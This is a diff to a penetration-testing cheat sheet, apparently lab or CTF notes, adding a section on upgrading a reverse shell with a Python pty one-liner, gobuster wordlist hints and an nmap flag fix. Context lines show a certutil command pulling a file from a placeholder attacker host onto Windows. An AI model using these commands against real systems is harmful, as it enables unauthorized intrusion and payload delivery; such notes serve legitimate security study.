@@ -6,13 +6,14 @@
 - [Login BruteForce](#log)
 - [Sql Injection](#si)
 - [File Transfer](#ft)
+- [Upgrade Shell](#us)
 
 ## Port Scanning <a name='ps'></a>
 
 ### Nmap
 - `-sV` shows the version of the service running on each port.
 - `-sC` uses additional scripts to gather more information.
-- `-p-`` scans all ports. 
+- `-p-` scans all ports. 
 - `-p <port>` scans only the specified port number. 
 -  `-- open` only displays open ports.
 - `--min-rate` Specifies the minimum number of packets Nmap should send per second; increasing this number speeds up the scan. 
@@ -52,6 +53,8 @@ smbclient -N -L \\\\10.129.117.14\\
 It is a command-line tool used for performing brute-force scans or directory and subdomain enumeration on a website.
 - To find subdirectories:
 ````bash
+#wordlist example:/usr/share/wordlists/dirb
+#machine example: 10.10.192.23
 gobuster dir -u <machine-ip> -w <wordlist> -o gobuster.out
 ````
 
@@ -132,3 +135,13 @@ certutil -urlcache -f 'http://<attacker-ip>/<file>' '<download-path-in-windows>'
 ```
 
 
+## Upgrade Shell <a name='us'></a>
+
+When we do a reverse shell, sometimes, we will need to upgrade our shell.
+
+### Python
+- Specifically, what it does is establish a new interactive terminal with advanced features, such as full control of function keys, command history, and the ability to use commands like Ctrl+C and Ctrl+Z. This can be useful in situations where greater interactivity is needed in a limited shell session.
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
